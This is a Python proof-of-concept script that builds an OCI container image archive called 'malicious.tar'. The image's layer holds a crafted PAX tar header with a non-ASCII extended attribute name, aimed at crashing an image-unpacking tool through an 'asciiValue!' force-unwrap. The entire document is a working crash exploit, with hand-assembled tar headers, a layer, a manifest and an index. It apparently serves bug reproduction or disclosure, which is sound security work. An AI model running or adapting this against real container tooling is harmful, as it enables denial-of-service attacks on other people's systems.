#!/usr/bin/env python3
"""Craft a malicious OCI image with a non-ASCII xattr name to trigger asciiValue! crash."""
import io, tarfile, gzip, hashlib, json, os, tempfile

XATTR_NAME  = "user.café"
XATTR_VALUE = b"xattr_value_" + b"A" * 80

def pax_header(pax_headers):
    records = b""
    for key, value in pax_headers.items():
        if isinstance(value, str): value = value.encode("utf-8")
        if isinstance(key, str): key = key.encode("utf-8")
        base = b" " + key + b"=" + value + b"\n"
        for extra in range(1, 5):
            total = extra + len(base)
            cand = str(total).encode() + base
            if len(cand) == total:
                records += cand
                break
    return records

def tar_hdr(name, mode, size, typeflag, uid=0, gid=0, mtime=0,
            linkname=b"", uname=b"root", gname=b"root",
            devmajor=0, devminor=0, prefix=b""):
    h = bytearray(512)
    def w(off, ln, val, num=False):
        if num: val = f"{val:0{ln-1}o}\x00".encode()
        h[off:off+min(len(val),ln)] = val[:ln]
    if isinstance(name, str): name = name.encode()
    if isinstance(typeflag, str): typeflag = typeflag.encode()
    if isinstance(linkname, str): linkname = linkname.encode()
    w(0,100,name); w(100,8,mode,True); w(108,8,uid,True); w(116,8,gid,True)
    w(124,12,size,True); w(136,12,mtime,True); w(148,8,b"        ")
    w(156,1,typeflag); w(157,100,linkname); w(257,6,b"ustar "); w(263,2,b"00")
    w(265,32,uname); w(297,32,gname); w(329,8,devmajor,True); w(337,8,devminor,True)
    w(345,155,prefix)
    ck = sum(h) & 0xFFFFFF
    w(148,8,f"{ck:06o}\0 ".encode())
    return bytes(h)

pk = f"SCHILY.xattr.{XATTR_NAME}"
payload = pax_header({pk: XATTR_VALUE})
padded = ((len(payload)+511)//512)*512

buf2 = io.BytesIO()
buf2.write(tar_hdr("PaxHeaders/trigger.txt", 0o000, len(payload), "x"))
buf2.write(payload + b"\x00"*(padded-len(payload)))
fc = b"TRIGGER\n"
buf2.write(tar_hdr("./trigger.txt", 0o644, len(fc), "0"))
buf2.write(fc + b"\x00"*(512-len(fc)))
buf2.write(b"\x00"*1024)
raw = buf2.getvalue()

gz_buf = io.BytesIO()
with gzip.GzipFile(fileobj=gz_buf, mode="wb", mtime=0) as gz:
    gz.write(raw)
layer_gz = gz_buf.getvalue()

sha = lambda b: "sha256:" + hashlib.sha256(b).hexdigest()
ld = sha(layer_gz)

with tempfile.TemporaryDirectory() as tmp:
    blobs = os.path.join(tmp, "blobs", "sha256")
    os.makedirs(blobs)
    with open(os.path.join(blobs, ld.split(":")[1]), "wb") as f:
        f.write(layer_gz)
    cfg = {
        "architecture": "arm64", "os": "linux",
        "config": {"Entrypoint": ["/bin/sh"],
                   "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]},
        "rootfs": {"type": "layers", "diff_ids": [sha(raw)]}
    }
    cb = json.dumps(cfg, sort_keys=True).encode()
    cd = sha(cb)
    with open(os.path.join(blobs, cd.split(":")[1]), "wb") as f:
        f.write(cb)
    mf = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {"mediaType": "application/vnd.oci.image.config.v1+json", "digest": cd, "size": len(cb)},
        "layers": [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": ld, "size": len(layer_gz)}]
    }
    mb = json.dumps(mf, sort_keys=True).encode()
    md = sha(mb)
    with open(os.path.join(blobs, md.split(":")[1]), "wb") as f:
        f.write(mb)
    idx = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [{
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "digest": md, "size": len(mb),
            "platform": {"architecture": "arm64", "os": "linux"},
            "annotations": {"org.opencontainers.image.ref.name": "malicious:latest"}
        }]
    }
    with open(os.path.join(tmp, "index.json"), "wb") as f:
        f.write(json.dumps(idx, sort_keys=True).encode())
    with open(os.path.join(tmp, "oci-layout"), "w") as f:
        json.dump({"imageLayoutVersion": "1.0.0"}, f)
    import tarfile as tf2
    with tf2.open("malicious.tar", "w:") as t:
        for r, ds, fs in os.walk(tmp):
            for fn in fs:
                full = os.path.join(r, fn)
                t.add(full, os.path.relpath(full, tmp))

print("[+] malicious.tar written")
print(f"[+] xattr: {XATTR_NAME!r}, value: {len(XATTR_VALUE)} bytes")
